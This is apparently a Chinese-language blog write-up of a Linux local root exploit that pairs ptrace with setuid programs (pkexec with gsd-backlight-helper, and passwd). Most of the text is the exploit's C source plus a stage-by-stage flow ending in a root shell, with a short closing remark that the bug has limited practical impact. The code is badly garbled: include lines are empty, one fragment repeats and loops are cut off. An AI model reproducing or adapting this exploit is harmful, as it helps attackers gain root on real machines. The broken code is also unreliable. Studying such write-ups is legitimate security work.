          unsigned long argv[2];                                              
          unsigned long envv[1];                                              
          char arg0[8];                                                       
          char path[1];                                                       
        } ipage = {                                                           
          .argv = { scratch_area + offsetof(struct injected_page, arg0) }     
        };                                                                    
        strcpy(ipage.arg0, arg0); 
         // 写 task B 的 内存    
        for (int i = 0; i       
    #include       
    #include       
    #include          
    #include       
    #include        
    #include        
    #include        
    #include       
    #include       
    #include          
    #include    
    #include     
    #include   
    #include     
    #include  
    #include     
    #include    
    static const char *helper_path="/usr/lib/gnome-settings-daemon/gsd-backlight-helper";
    static int block_pipe[2];
    static int self_fd=-1;
    static int dummy_status;
    static char *tprintf(char *fmt, ... ){
        static char buf[10000];
        va_list ap;
        va_start(ap,fmt);
        vsprintf(buf,fmt,ap);
        va_end(ap);
        return buf;
    }
    static int middle_main(void *dummy){
        /*prctl(PR_SET_PDEATHSIG, SIGKILL);*/
        // task B
        pid_t middle = getpid();
        self_fd = open("/proc/self/exe",O_RDONLY);
        fprintf(stderr,"01 task B fork task Cn");
        pid_t child = fork();
        if(child==0){
            // task C
            /*prctl(PR_SET_PDEATHSIG, SIGKILL);*/
            dup2(self_fd,42);
            int proc_fd = open(tprintf("/proc/%d/status",middle),O_RDONLY);
            char *needle = tprintf("nUid:t%dt0t", getuid());
            while(1){
                char buf[1000];
                ssize_t buflen =  pread(proc_fd,buf,sizeof(buf)-1,0);
                buf[buflen]='';
                if(strstr(buf,needle))break;
            }
            fprintf(stderr,"03 task C trigger tracemen");
            ptrace(PTRACE_TRACEME,0,NULL,NULL);
            fprintf(stderr,"04 exec suid /usr/bin/passwdn");
            execl("/usr/bin/passwd","passwd",NULL);
        }
        fprintf(stderr,"02 task B execl suid pkexecn");
        dup2(self_fd,0);
        // stdout pw_name,helper_path,"--help",NULL);
        err(1,"execl pkexecn");
    }
    static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
        struct user_regs_struct regs;                                         
        struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };    
        ptrace(PTRACE_SYSCALL, pid, 0, NULL);                           
        waitpid(pid, &dummy_status, 0);                                 
        ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov);
        /* set up indirect arguments */                                       
        unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;          
        struct injected_page {                                                
          unsigned long argv[2];                                              
          unsigned long envv[1];                                              
          char arg0[8];                                                       
          char path[1];                                                       
        } ipage = {                                                           
          .argv = { scratch_area + offsetof(struct injected_page, arg0) }     
        };                                                                    
        strcpy(ipage.arg0, arg0);                                             
        for (int i = 0; i  `pipe2 write` -> `clone task B` -> `wait task B pkexec`  
`task B` -> `fork task C` -> `dup pipe 到 stdout` -> `pkexec` -> `pipe write
hang`  
`task C` -> `wait task B pkexec` -> `ptrace traceme` -> `/usr/bin/passwd`  
`task A` -> `更换 task B 内存` -> `stage2` -> `更换 task C 内存` ->`stage3` -> `root
shell`
## 总结
总体来看这个漏洞的限制还是比较大的  
首先要找到一个内部有减权的 suid 程序就比较难了  
pkexec 是linux 桌面 freedestop 上的验证程序，也就是说非桌面版本就可能没有这个东西，要用它也只能在桌面上。  
像 android ，它把 suid 程序都去除了这个漏洞就几乎造不成什么影响。  
这个漏洞和之前的 [usb creator 漏洞](https://xz.aliyun.com/t/5683)差不多，实际应用上感觉都有点鸡肋。
## reference